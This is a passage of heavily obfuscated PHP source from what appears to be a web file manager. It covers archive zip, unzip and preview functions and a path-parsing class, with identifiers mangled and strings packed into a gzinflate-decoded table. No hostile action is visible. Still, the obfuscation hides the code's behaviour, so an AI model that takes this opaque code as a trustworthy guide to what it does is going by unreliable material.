$fÇï’á¹ğö[$_SERVER[¿õñ][78]] : 0; } public function info($F»ÈŒÄ¬Õ) { if ($this->isFolder($F»ÈŒÄ¬Õ)) { return $this->folderInfo($F»ÈŒÄ¬Õ); } else { if ($this->isFile($F»ÈŒÄ¬Õ)) { return $this->fileInfo($F»ÈŒÄ¬Õ); } } return !1; } public function exist($AŞ´ßó‘É…) { return $this->isFile($AŞ´ßó‘É…) || $this->isFolder($AŞ´ßó‘É…); } public function isFile($A‡›ÛŒ™í) { return !$this->isFolder($A‡›ÛŒ™í) && $this->objectMeta($A‡›ÛŒ™í); } public function isFolder($e‘Şê‹ÂÎ) { return $this->cacheMehod($_SERVER[¿õñ][220], $e‘Şê‹ÂÎ); } protected function objectMeta($AšŒâÀ¿æ§) { return $this->cacheMehod($_SERVER[¿õñ][221], $AšŒâÀ¿æ§); } protected function _objectMeta($a«±¸ñ¾î¾) { $b†ÑØ°–Ş =& $_SERVER[¿õñ]; try { $E˜‡¸Ë¾±À = $this->client->getObjectInfo($this->bucket, $a«±¸ñ¾î¾); if (!isset($E˜‡¸Ë¾±À[$b†ÑØ°–Ş[204]]) && isset($E˜‡¸Ë¾±À[$b†ÑØ°–Ş[222]])) { $E˜‡¸Ë¾±À[$b†ÑØ°–Ş[204]] = $E˜‡¸Ë¾±À[$b†ÑØ°–Ş[222]]; } } catch (OSS\Core\OssException $DßŒ¹÷Şæ) { $E˜‡¸Ë¾±À = !1; } return $E˜‡¸Ë¾±À; } protected function _isFolder($fëó†Ùß¡) { $DàÙ²ìº¦á = $this->listObjs($fëó†Ùß¡, null, 1); return !empty($DàÙ²ìº¦á) ? !0 : !1; } } define($_SERVER[¿õñ][223], 1); goto Dİ‰ÜâíµÍ; Fó–¯¸Âï: $f­Éœ† ÆÒ = $_SERVER[¿õñ][539]; $_SERVER[°Šë¾«øµÑ] = explode($_SERVER[¿õñ][540], gzinflate(substr($_SERVER[¿õñ][541], 10, -8))); $eŞ§º¥²ç = $_SERVER[¿õñ][542]; goto dï£Õ±Áœ; E¨¬ª÷Ò¹: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b›ÄÌ¡ó“°; if (!$b›ÄÌ¡ó“°) { $cÁ‘ŒÌßğ = IO::init($_SERVER[¿õñ][8]); } return $cÁ‘ŒÌßğ; } private static function iconvSystem($eä¿‹¬ÀÆ) { return self::local()->iconvSystem($eä¿‹¬ÀÆ); } private static function iconvApp($fáùÚ…¥ĞÏ) { return self::local()->iconvApp($fáùÚ…¥ĞÏ); } public static function zip($Fí¯öñÖÁİ, $Då“ ìŞƒÂ = "\172\x69\x70", $Eã¹¼‚µŞï = '', $EŒÀõªö†„ = REPEAT_RENAME) { goto CÂ´¿‰ÂÒÜ; CÂ´¿‰ÂÒÜ: $a­Éå‘Ù¯Ï =& $_SERVER[¿õñ]; $aî•Œ¾°É˜ = self::init($Fí¯öñÖÁİ[0][$a­Éå‘Ù¯Ï[76]]); $c¤ŞÛ–‡ = self::info($Fí¯öñÖÁİ[0][$a­Éå‘Ù¯Ï[76]]); goto b˜â¤¯Ûé; ešŠÇîëë: return $c¥ŒÖÀ½Ç£; goto FºÜÓæßõ£; F°®œ¡‚âÚ: foreach ($BÄ¨ëÚä•Ú as $cµõ±ƒ”íŸ => $cÎù‰µ–«¸) { $BÄ¨ëÚä•Ú[$cµõ±ƒ”íŸ] = self::iconvSystem($cÎù‰µ–«¸); } KodArchive::create($b¶…¾Š˜šö, $BÄ¨ëÚä•Ú); if (!IO::exist($eÛ¬øù‰éğ)) { if ($d¶·‘ó×ò) { del_dir($d¶·‘ó×ò); } show_json(LNG($a­Éå‘Ù¯Ï[1012]), !1); } goto c¶“Ö¹†ª—; b˜â¤¯Ûé: $d¶·‘ó×ò = !1; if (!$Eã¹¼‚µŞï && $aî•Œ¾°É˜->getType() == $a­Éå‘Ù¯Ï[102]) { $BÄ¨ëÚä•Ú = self::zipFileList($Fí¯öñÖÁİ); } else { $d¶·‘ó×ò = $Eã¹¼‚µŞï ? $Eã¹¼‚µŞï : TEMP_FILES . $a­Éå‘Ù¯Ï[1010] . time() . rand_string(8) . $a­Éå‘Ù¯Ï[8]; mk_dir($d¶·‘ó×ò); $BÄ¨ëÚä•Ú = self::zipFileList($Fí¯öñÖÁİ, $d¶·‘ó×ò); } $E¨——Î’Ö = $c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[28]]; goto AêôÂ“™ˆ; F‘Ù¥»Úù¿: $c¥ŒÖÀ½Ç£ = self::move($eÛ¬øù‰éğ, $a„µ‹ãñÂï, $EŒÀõªö†„); if (!$c¥ŒÖÀ½Ç£) { del_dir($d¶·‘ó×ò); show_json(LNG($a­Éå‘Ù¯Ï[1012]), !1); } del_dir($d¶·‘ó×ò); goto ešŠÇîëë; c¶“Ö¹†ª—: if ($Eã¹¼‚µŞï || !$d¶·‘ó×ò) { if ($d¶·‘ó×ò && strstr($d¶·‘ó×ò, TEMP_FILES)) { $b™ï©°ÈÜ = $BÄ¨ëÚä•Ú = array(); recursion_dir($D¢Ê‡ÙÚÑŞ, $b™ï©°ÈÜ, $BÄ¨ëÚä•Ú, 0); foreach ($b™ï©°ÈÜ as $fğ˜–‘ÜÌä) { del_dir($fğ˜–‘ÜÌä); } foreach ($BÄ¨ëÚä•Ú as $c”ÙğŞ‹¢†) { if ($c”ÙğŞ‹¢† == $b¶…¾Š˜šö) { continue; } del_file($c”ÙğŞ‹¢†); } } return $eÛ¬øù‰éğ; } $a„µ‹ãñÂï = self::pathFather($c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[76]]); $a„µ‹ãñÂï = $aî•Œ¾°É˜->getPathOuter($aî•Œ¾°É˜->iconvSystem($a„µ‹ãñÂï)); goto F‘Ù¥»Úù¿; c•ÖÚ©ğ: $eÛ¬øù‰éğ = $D¢Ê‡ÙÚÑŞ . $E¨——Î’Ö . $a­Éå‘Ù¯Ï[92] . $Då“ ìŞƒÂ; $eÛ¬øù‰éğ = get_filename_auto($eÛ¬øù‰éğ, $a­Éå‘Ù¯Ï[33], $EŒÀõªö†„); $b¶…¾Š˜šö = self::iconvSystem($eÛ¬øù‰éğ); goto F°®œ¡‚âÚ; AêôÂ“™ˆ: if (count($BÄ¨ëÚä•Ú) > 1) { $EŒ‹Ğ¤†‡Á = isset($c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[462]]) ? $c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[462]] : $c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[76]]; $E¨——Î’Ö = get_path_this(get_path_father($EŒ‹Ğ¤†‡Á)); } $D¢Ê‡ÙÚÑŞ = $d¶·‘ó×ò; if (!$D¢Ê‡ÙÚÑŞ) { $D¢Ê‡ÙÚÑŞ = get_path_father($c¤ŞÛ–‡[$a­Éå‘Ù¯Ï[76]]); $A‚ªğ“Œ = IO::info($D¢Ê‡ÙÚÑŞ); if (!$A‚ªğ“Œ[$a­Éå‘Ù¯Ï[186]]) { show_json(LNG($a­Éå‘Ù¯Ï[1011]), !1); } } goto c•ÖÚ©ğ; FºÜÓæßõ£: } public static function unzip($bâİÓáô°ö, $a„·¬‘¯— = "\x72\x65\160\154\x61\x63\x65") { goto fä‘“óæ; BòÅ“Ôöš‰: del_dir($aö–Ä”Ô±Ã); if (!$Bîù¥¹ŒÏ¿) { del_file($EÏ‡­â¥Œó); } return !0; goto F…õ¯Ô·¾º; FÕÜÍÄ¶«ï: $Eê‘Ïà©²ç = self::tmpFileName($E´ì“¶¹Æ¹); $aö–Ä”Ô±Ã = TEMP_FILES . $Eê‘Ïà©²ç; del_dir($aö–Ä”Ô±Ã); goto cÔ¼¨ê…; cÔ¼¨ê…: mk_dir($aö–Ä”Ô±Ã); $EÏ‡­â¥Œó = $aö–Ä”Ô±Ã . $f³ëØ¯ô­[92] . $E´ì“¶¹Æ¹[$f³ëØ¯ô­[157]]; if (!@file_exists(self::iconvSystem($EÏ‡­â¥Œó))) { $Bîù¥¹ŒÏ¿ = self::localFilePath($Aª¸Âç§™, $E´ì“¶¹Æ¹[$f³ëØ¯ô­[157]]); $EÏ‡­â¥Œó = $Bîù¥¹ŒÏ¿ ? $Bîù¥¹ŒÏ¿ : parent::download($Aª¸Âç§™, $EÏ‡­â¥Œó); } goto E‚á‚Ÿİ¹ˆ; e¢¾´ÁÏÖÚ: self::archiveExt(); if (!$eÌ³£ã†Ó[$f³ëØ¯ô­[1017]]) { show_json($f³ëØ¯ô­[1018] . $eÌ³£ã†Ó[$f³ëØ¯ô­[1019]], !1); } Hook::trigger($f³ëØ¯ô­[1020], $aö–Ä”Ô±Ã); goto AÔ‰×¦æ¾; bõó§Ù§‹¢: if (!($E´ì“¶¹Æ¹ = parent::info($Aª¸Âç§™))) { show_json(LNG($f³ëØ¯ô­[1014]), !1); } if (!($aİ…†Ø¦ï¨ = parent::infoFull($dùËÔà©ç))) { $dùËÔà©ç = parent::mkdir($dùËÔà©ç); $aİ…†Ø¦ï¨ = array($f³ëØ¯ô­[76] => $dùËÔà©ç); } else { if (isset($aİ…†Ø¦ï¨[$f³ëØ¯ô­[366]]) && trim($aİ…†Ø¦ï¨[$f³ëØ¯ô­[76]], $f³ëØ¯ô­[8]) != trim($dùËÔà©ç, $f³ëØ¯ô­[8])) { $d›àÖä¨ê = KodIO::make($aİ…†Ø¦ï¨[$f³ëØ¯ô­[457]]); $añÏé¿¿ôÇ = parent::fileNameAuto($d›àÖä¨ê, $aİ…†Ø¦ï¨[$f³ëØ¯ô­[28]], REPEAT_RENAME_FOLDER, !0); $dùËÔà©ç = parent::mkdir($d›àÖä¨ê . $añÏé¿¿ôÇ); $aİ…†Ø¦ï¨ = array($f³ëØ¯ô­[76] => $dùËÔà©ç); } } $dùËÔà©ç = $aİ…†Ø¦ï¨[$f³ëØ¯ô­[76]]; goto FÕÜÍÄ¶«ï; E‚á‚Ÿİ¹ˆ: $EÏ‡­â¥Œó = self::iconvSystem($EÏ‡­â¥Œó); $c“­ñ§´ÖÛ = isset($bâİÓáô°ö[$f³ëØ¯ô­[1015]]) ? $bâİÓáô°ö[$f³ëØ¯ô­[1015]] : $f³ëØ¯ô­[1016]; $eÌ³£ã†Ó = KodArchive::extract($EÏ‡­â¥Œó, $aö–Ä”Ô±Ã . $f³ëØ¯ô­[8], $c“­ñ§´ÖÛ); goto e¢¾´ÁÏÖÚ; AÔ‰×¦æ¾: recursion_dir($aö–Ä”Ô±Ã, $d»ŒŠ˜æŠî, $D­ß§Ü÷, 0); $A–’ä Ûô” = array_merge($d»ŒŠ˜æŠî, $D­ß§Ü÷); foreach ($A–’ä Ûô” as $AÅ‘ËÖøî—) { $AÅ‘ËÖøî— = self::iconvApp($AÅ‘ËÖøî—); self::move($AÅ‘ËÖøî—, $dùËÔà©ç, $a„·¬‘¯—); } goto BòÅ“Ôöš‰; fä‘“óæ: $f³ëØ¯ô­ =& $_SERVER[¿õñ]; $Aª¸Âç§™ = $bâİÓáô°ö[$f³ëØ¯ô­[76]]; $dùËÔà©ç = $bâİÓáô°ö[$f³ëØ¯ô­[1013]]; goto bõó§Ù§‹¢; F…õ¯Ô·¾º: } public static function unzipList($Eè×áÒ‹ö) { goto c£Ç‘‹°Æ; C©åÇÌ”Æ: $D¯˜Ì‰ÏŠÊ = $C¼íìÒ¼Æ™ . $BîëÚ¬À´ [8] . $eñÃ±ƒ¹ˆ×; if (!@file_exists(self::iconvSystem($D¯˜Ì‰ÏŠÊ))) { if (isset($fÆÆ‡ŞÔÔÃ)) { url_request($a°‹å×²öß, $BîëÚ¬À´ [1024], $D¯˜Ì‰ÏŠÊ); } else { $B·èÅÉ©Ê = self::localFilePath($a°‹å×²öß, $E¯¿Ê¥Ë«[$BîëÚ¬À´ [157]]); $D¯˜Ì‰ÏŠÊ = $B·èÅÉ©Ê ? $B·èÅÉ©Ê : self::download($a°‹å×²öß, $D¯˜Ì‰ÏŠÊ); } } $D¯˜Ì‰ÏŠÊ = self::iconvSystem($D¯˜Ì‰ÏŠÊ); goto Dæ„Î‘”Ñ„; C´²Ø†­¢³: if ($BÀß’ºšä == -1) { $bÂÓèŠ´…º = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\x69\145\x77\57{$Cˆ£Ğî¹Ã}\x2f{$eñÃ±ƒ¹ˆ×}\56\x6c\x6f\147"; $CõØ’õòî = self::infoFull($bÂÓèŠ´…º); if ($CõØ’õòî) { $bÂÓèŠ´…º = $CõØ’õòî[$BîëÚ¬À´ [76]]; $f ÙƒµÓ ò = self::getContent($bÂÓèŠ´…º); if ($f ÙƒµÓ ò) { $aÆ×¨¢§×Ş = json_decode($f ÙƒµÓ ò, !0); if (count($aÆ×¨¢§×Ş) >= $F™ˆÛóƒÊÙ) { show_json(sprintf(LNG($BîëÚ¬À´ [1023]), count($aÆ×¨¢§×Ş)), !1); } return $aÆ×¨¢§×Ş; } } else { $bÂÓèŠ´…º = self::mkfile($bÂÓèŠ´…º); } } $C¼íìÒ¼Æ™ = TEMP_FILES . $Cˆ£Ğî¹Ã; if (!is_dir($C¼íìÒ¼Æ™)) { mk_dir($C¼íìÒ¼Æ™); } goto C©åÇÌ”Æ; e·Œ°´À: $F™ˆÛóƒÊÙ = 50000; if (request_url_safe($a°‹å×²öß)) { $fÆÆ‡ŞÔÔÃ = parse_url_query($a°‹å×²öß); if (!isset($fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [76]])) { show_json($BîëÚ¬À´ [1022], !1); } } $Fãœ¯ëÒ¬„ = isset($fÆÆ‡ŞÔÔÃ) ? $fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [76]] : $a°‹å×²öß; goto CãÙÃ´öÕä; BÙˆ²èåº¿: self::setContent($bÂÓèŠ´…º, $aÆ×¨¢§×Ş); if (count($c‡–İÅ…¤[$BîëÚ¬À´ [1019]]) >= $F™ˆÛóƒÊÙ) { show_json(sprintf(LNG($BîëÚ¬À´ [1023]), count($c‡–İÅ…¤[$BîëÚ¬À´ [1019]])), !1); } return $c‡–İÅ…¤[$BîëÚ¬À´ [1019]]; goto bÙòÕçŸÙØ; Dæ„Î‘”Ñ„: if ($BÀß’ºšä >= 0) { $c¤ƒƒ¦Ä«Ó = isset($Eè×áÒ‹ö[$BîëÚ¬À´ [1025]]) ? $Eè×áÒ‹ö[$BîëÚ¬À´ [1025]] : !1; $b×Ë‡ø‘¸ = isset($Eè×áÒ‹ö[$BîëÚ¬À´ [28]]) ? $Eè×áÒ‹ö[$BîëÚ¬À´ [28]] : $BîëÚ¬À´ [33]; KodArchive::filePreview($D¯˜Ì‰ÏŠÊ, $BÀß’ºšä, $c¤ƒƒ¦Ä«Ó, $b×Ë‡ø‘¸); self::archiveExt(); die; } $c‡–İÅ…¤ = KodArchive::listContent($D¯˜Ì‰ÏŠÊ); self::archiveExt(); goto cÂœ…‡¶ŠÇ; cÂœ…‡¶ŠÇ: del_dir($C¼íìÒ¼Æ™); if (!$c‡–İÅ…¤[$BîëÚ¬À´ [1017]]) { show_json($c‡–İÅ…¤[$BîëÚ¬À´ [1019]], !1); } $aÆ×¨¢§×Ş = json_encode($c‡–İÅ…¤[$BîëÚ¬À´ [1019]]); goto BÙˆ²èåº¿; c£Ç‘‹°Æ: $BîëÚ¬À´  =& $_SERVER[¿õñ]; $a°‹å×²öß = $Eè×áÒ‹ö[$BîëÚ¬À´ [76]]; $BÀß’ºšä = isset($Eè×áÒ‹ö[$BîëÚ¬À´ [1021]]) ? $Eè×áÒ‹ö[$BîëÚ¬À´ [1021]] : -1; goto e·Œ°´À; CãÙÃ´öÕä: $E¯¿Ê¥Ë« = self::info($Fãœ¯ëÒ¬„); $Cˆ£Ğî¹Ã = self::tmpFileName($E¯¿Ê¥Ë«); if (isset($fÆÆ‡ŞÔÔÃ)) { $F–¢Ö‰Åò´ = array($fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [76]], $fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [1021]], $fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [28]]); $eñÃ±ƒ¹ˆ× = md5(implode($BîëÚ¬À´ [71], $F–¢Ö‰Åò´)) . $BîëÚ¬À´ [92] . get_path_ext($fÆÆ‡ŞÔÔÃ[$BîëÚ¬À´ [28]]); } else { $F–¢Ö‰Åò´ = array($E¯¿Ê¥Ë«[$BîëÚ¬À´ [28]], $E¯¿Ê¥Ë«[$BîëÚ¬À´ [76]], $E¯¿Ê¥Ë«[$BîëÚ¬À´ [78]]); $eñÃ±ƒ¹ˆ× = md5(implode($BîëÚ¬À´ [71], $F–¢Ö‰Åò´)) . $BîëÚ¬À´ [92] . $E¯¿Ê¥Ë«[$BîëÚ¬À´ [157]]; } goto C´²Ø†­¢³; bÙòÕçŸÙØ: } private static function zipFileList($E¸š¡¿ÓÕ¦, $c¤ö£óÈËË = false) { $Aİ¯©àÜç =& $_SERVER[¿õñ]; $D‡›—Æ’ˆ” = array(); foreach ($E¸š¡¿ÓÕ¦ as $e¡²Œ˜‡Ô˜) { $AÄâÂîÍŸÁ = $e¡²Œ˜‡Ô˜[$Aİ¯©àÜç[76]]; if ($c¤ö£óÈËË) { $AÄâÂîÍŸÁ = self::copy($e¡²Œ˜‡Ô˜[$Aİ¯©àÜç[76]], $c¤ö£óÈËË, $Aİ¯©àÜç[751]); } if ($AÄâÂîÍŸÁ && self::local()->exist($AÄâÂîÍŸÁ)) { $D‡›—Æ’ˆ”[$e¡²Œ˜‡Ô˜[$Aİ¯©àÜç[76]]] = $AÄâÂîÍŸÁ; } } if (!empty($D‡›—Æ’ˆ”)) { return array_values($D‡›—Æ’ˆ”); } show_json(LNG($Aİ¯©àÜç[1026]), !1); } public static function tmpFileName($CŠ£ƒ¼µÆ‘) { $DàƒÈ´¾¹Ğ =& $_SERVER[¿õñ]; $FçŒâÜ±› = array($CŠ£ƒ¼µÆ‘[$DàƒÈ´¾¹Ğ[28]], $CŠ£ƒ¼µÆ‘[$DàƒÈ´¾¹Ğ[76]], $CŠ£ƒ¼µÆ‘[$DàƒÈ´¾¹Ğ[78]], $CŠ£ƒ¼µÆ‘[$DàƒÈ´¾¹Ğ[455]]); return md5(implode($DàƒÈ´¾¹Ğ[71], $FçŒâÜ±›)); } private static function localFilePath($CÔ–Ö‰—¾, $f„ÈœĞŒàï) { goto A‚ Ãğ–ĞÄ; Aˆ×¾äÀøÍ: return $B¡çÛì·•’->path; goto DË¡†õËØŠ; A‚ Ãğ–ĞÄ: $FÃÏ•¨œ¨à =& $_SERVER[¿õñ]; $cÏ©ÚäƒÍ§ = KodIO::parse($CÔ–Ö‰—¾); if ($cÏ©ÚäƒÍ§[$FÃÏ•¨œ¨à[29]] == KodIO::KOD_SOURCE) { $bôƒ®½šŠ = Model($FÃÏ•¨œ¨à[759])->fileInfoGet(KodIO::sourceID($CÔ–Ö‰—¾)); if (!$bôƒ®½šŠ[$FÃÏ•¨œ¨à[76]]) { show_json($FÃÏ•¨œ¨à[1027], !1); } $CÔ–Ö‰—¾ = $bôƒ®½šŠ[$FÃÏ•¨œ¨à[76]]; } goto Aˆ¦‡ºŸ©; BÅ÷Ş†ñ…Ÿ: if ($AÍø§­ŠŒ != $FÃÏ•¨œ¨à[102] || $f„ÈœĞŒàï == $FÃÏ•¨œ¨à[1029] && $D¼Î—õ¨¸¤) { return !1; } if (!$B¡çÛì·•’->exist($B¡çÛì·•’->path)) { show_json(LNG($FÃÏ•¨œ¨à[101]), !1); } self::archiveExt($f„ÈœĞŒàï); goto Aˆ×¾äÀøÍ; Aˆ¦‡ºŸ©: $B¡çÛì·•’ = self::init($CÔ–Ö‰—¾); $AÍø§­ŠŒ = $B¡çÛì·•’->getType(); $D¼Î—õ¨¸¤ = strtoupper(substr(PHP_OS, 0, 3)) == $FÃÏ•¨œ¨à[1028]; goto BÅ÷Ş†ñ…Ÿ; DË¡†õËØŠ: } private static function archiveExt($bÛñ˜¸òØó = '') { $GLOBALS[$_SERVER[¿õñ][1030]] = $bÛñ˜¸òØó; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\122\x65\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\x46\151\x6c\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\x46\x69\x6c\x65\x54\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\122\157\x6f\x74\x53\145\154\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\x53\x68\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\123\x68\141\162\145\x4c\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\x65\x49\x74\x65\155\114\151\156\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\x65\156\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\165\163\x65\162\104\162\151\x76\145\x72\175"; public static function typeList() { $f ÊÁ¸ê­¦ =& $_SERVER[¿õñ]; return array($f ÊÁ¸ê­¦[1031] => self::KOD_SOURCE, $f ÊÁ¸ê­¦[1032] => self::KOD_USER_RECYCLE, $f ÊÁ¸ê­¦[1033] => self::KOD_USER_FAV, $f ÊÁ¸ê­¦[1034] => self::KOD_USER_FILE_TAG, $f ÊÁ¸ê­¦[1035] => self::KOD_USER_FILE_TYPE, $f ÊÁ¸ê­¦[1036] => self::KOD_GROUP_ROOT_SELF, $f ÊÁ¸ê­¦[1037] => self::KOD_USER_SHARE, $f ÊÁ¸ê­¦[1038] => self::KOD_USER_SHARE_LINK, $f ÊÁ¸ê­¦[1039] => self::KOD_USER_SHARE_TO_ME, $f ÊÁ¸ê­¦[1040] => self::KOD_SHARE_ITEM, $f ÊÁ¸ê­¦[1041] => self::KOD_SHARE_LINK, $f ÊÁ¸ê­¦[1042] => self::KOD_SEARCH, $f ÊÁ¸ê­¦[1043] => self::KOD_BLOCK, $f ÊÁ¸ê­¦[1044] => self::KOD_IO, $f ÊÁ¸ê­¦[1045] => self::KOD_USER_RECENT, $f ÊÁ¸ê­¦[1046] => self::KOD_USER_DRIVER); } public static function parse($c„‡À‰’¿Î) { goto bëæãÒ‡íÎ; Cò”Ö˜éá™: return $e½¸»İŸ¿; goto BÕö‚®äö¢; Bº¼ÌÜÚ‚ë: preg_match($Dªœ…‡ŠÚ–[1047], $c„‡À‰’¿Î, $fÖ¢ñŒÌ×); $e½¸»İŸ¿ = array($Dªœ…‡ŠÚ–[385] => !1, $Dªœ…‡ŠÚ–[1048] => !1, $Dªœ…‡ŠÚ–[382] => !1, $Dªœ…‡ŠÚ–[76] => $c„‡À‰’¿Î, $Dªœ…‡ŠÚ–[996] => !1, $Dªœ…‡ŠÚ–[995] => $Dªœ…‡ŠÚ–[33]); if (is_array($fÖ¢ñŒÌ×) && count($fÖ¢ñŒÌ×) == 5) { $Bæğø’Š‹¡ = $Dªœ…‡ŠÚ–[1049] . $fÖ¢ñŒÌ×[2] . $Dªœ…‡ŠÚ–[312]; if (in_array($Bæğø’Š‹¡, $FŒÀÍƒ‰’†)) { $e½¸»İŸ¿[$Dªœ…‡ŠÚ–[996]] = $fÖ¢ñŒÌ×[1]; $e½¸»İŸ¿[$Dªœ…‡ŠÚ–[29]] = $Bæğø’Š‹¡; $e½¸»İŸ¿[$Dªœ…‡ŠÚ–[1050]] = substr($Bæğø’Š‹¡, 1, -1); $e½¸»İŸ¿[$Dªœ…‡ŠÚ–[364]] = $fÖ¢ñŒÌ×[3]; } $e½¸»İŸ¿[$Dªœ…‡ŠÚ–[995]] = $fÖ¢ñŒÌ×[4]; } goto Cò”Ö˜éá™; bëæãÒ‡íÎ: $Dªœ…‡ŠÚ– =& $_SERVER[¿õñ]; $c„‡À‰’¿Î = self::clear($c„‡À‰’¿Î); $FŒÀÍƒ‰’† = array_values(self::typeList()); goto Bº¼ÌÜÚ‚ë; BÕö‚®äö¢: } public static function clear($FëèÑ‡‹º˜) { goto C¡©ÙØ«¹¶; C¡©ÙØ«¹¶: $B¸…Ùˆ«ó… =& $_SERVER[¿õñ]; $FëèÑ‡‹º˜ = str_replace($B¸…Ùˆ«ó…[94], $B¸…Ùˆ«ó…[8], $FëèÑ‡‹º˜); $D‘©‘†Ğİ† = $B¸…Ùˆ«ó…[1051]; goto DÓéÈõÙë‡; bÃ¦Æ­½«å: if ($FëèÑ‡‹º˜ == $B¸…Ùˆ«ó…[8]) { return $B¸…Ùˆ«ó…[8]; } $FëèÑ‡‹º˜ = rtrim($FëèÑ‡‹º˜, $B¸…Ùˆ«ó…[8]); return $FëèÑ‡‹º˜; goto EÏ‹ÀËÙíª; DÓéÈõÙë‡: if (substr($FëèÑ‡‹º˜, 0, 3) == $B¸…Ùˆ«ó…[1052]) { $FëèÑ‡‹º˜ = substr($FëèÑ‡‹º˜, 3); } while (strstr($FëèÑ‡‹º˜, $D‘©‘†Ğİ†)) { $FëèÑ‡‹º˜ = str_replace($D‘©‘†Ğİ†, $B¸…Ùˆ«ó…[8], $FëèÑ‡‹º˜); } $FëèÑ‡‹º˜ = preg_replace($B¸…Ùˆ«ó…[1053], $B¸…Ùˆ«ó…[8], $FëèÑ‡‹º˜); goto bÃ¦Æ­½«å; EÏ‹ÀËÙíª: } public static function sourceID($c²ğ‡â®É„) { $C¡Ğ¡ÎÆ»Ú =& $_SERVER[¿õñ]; $Dä½İƒ•ëß = self::parse($c²ğ‡â®É„); if ($Dä½İƒ•ëß[$C¡Ğ¡ÎÆ»Ú[29]] !== self::KOD_SOURCE) { show_json(LNG($C¡Ğ¡ÎÆ»Ú[1054]), !1); } return $Dä½İƒ•ëß[$C¡Ğ¡ÎÆ»Ú[364]]; } public static function make($aÑø·Æ©”Ñ) { if (!$aÑø·Æ©”Ñ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($aÑø·Æ©”Ñ)); } public static function makeShare($Dô¯†ˆÖ, $D®•—‹Ä­) { return self::makePath(self::KOD_SHARE_ITEM, $Dô¯†ˆÖ, $D®•—‹Ä­); } public static function makeFileTypePath($cÀÖ÷º™•) { return self::makePath(self::KOD_USER_FILE_TYPE, $cÀÖ÷º™•); } public static function makeFileTagPath($a¬¸Áì˜„¥) { return self::makePath(self::KOD_USER_FILE_TAG, $a¬¸Áì˜„¥); } public static function makePath($FÚ˜Ø†Ş˜¯, $e¢Á–¥Ü‹ë = '', $C­‚ˆñÏ† = '') { $fÇŒš‚Ù„ =& $_SERVER[¿õñ]; $c²°’åÚí = substr($FÚ˜Ø†Ş˜¯, 1, -1); $E’’ÌìÀÑ¤ = $fÇŒš‚Ù„[1055] . $c²°’åÚí . $fÇŒš‚Ù„[732] . $e¢Á–¥Ü‹ë . $fÇŒš‚Ù„[1056]; $E’’ÌìÀÑ¤ = $C­‚ˆñÏ† ? $E’’ÌìÀÑ¤ . $C­‚ˆñÏ† . $fÇŒš‚Ù„[8] : $E’’ÌìÀÑ¤; return $E’’ÌìÀÑ¤; } public static function hashPath($dàÑ¶ÎöÌê) { $Dƒåá²Ğ÷® =& $_SERVER[¿õñ]; $fò¦ÈÉĞ±… = is_array($dàÑ¶ÎöÌê) ? $dàÑ¶ÎöÌê : IO::info($dàÑ¶ÎöÌê); $e–œ¼½Ï‰ò = _get($fò¦ÈÉĞ±…, $Dƒåá²Ğ÷®[1057], $Dƒåá²Ğ÷®[33]); if (!$e–œ¼½Ï‰ò) { $ağ‰ÏÅäŒÅ = KodIO::parse($fò¦ÈÉĞ±…[$Dƒåá²Ğ÷®[76]]); if (!$ağ‰ÏÅäŒÅ[$Dƒåá²Ğ÷®[29]]) { $e–œ¼½Ï‰ò = IO::hashSimple($fò¦ÈÉĞ±…[$Dƒåá²Ğ÷®[76]]); } } if (!$e–œ¼½Ï‰ò) { $e–œ¼½Ï‰ò = md5($fò¦ÈÉĞ±…[$Dƒåá²Ğ÷®[76]] . $fò¦ÈÉĞ±…[$Dƒåá²Ğ÷®[78]] . $fò¦ÈÉĞ±…[$Dƒåá²Ğ÷®[106]]); } return $e–œ¼½Ï‰ò; } public static function initSystemPath() { $cí‡Ó’‰Ğá =& $_SERVER[¿õñ]; $eóñã¶Ó ¸ = array($cí‡Ó’‰Ğá[1058] => $cí‡Ó’‰Ğá[1059], $cí‡Ó’‰Ğá[1060] => $cí‡Ó’‰Ğá[1061], $cí‡Ó’‰Ğá[1062] => $cí‡Ó’‰Ğá[1063], $cí‡Ó’‰Ğá[1064] => $cí‡Ó’‰Ğá[1065]); foreach ($eóñã¶Ó ¸ as $Dô…ï°ÜÓÂ => $Fš¤ã›ÂÎŸ) { if (!defined($Dô…ï°ÜÓÂ)) { define($Dô…ï°ÜÓÂ, self::systemPath($Fš¤ã›ÂÎŸ)); } } } private static function systemPath($d°ößÄ¥ª¿) { goto AÖ’õÙäÚ; AÖ’õÙäÚ: $c é¼Ğš‚ê =& $_SERVER[¿õñ]; $eÊÁË¬Ë©à = $c é¼Ğš‚ê[1066] . ucfirst($d°ößÄ¥ª¿); $AÇ”ºİ›§é = Model($c é¼Ğš‚ê[1067])->get($eÊÁË¬Ë©à); goto F¹ª˜å¥ÎŒ; 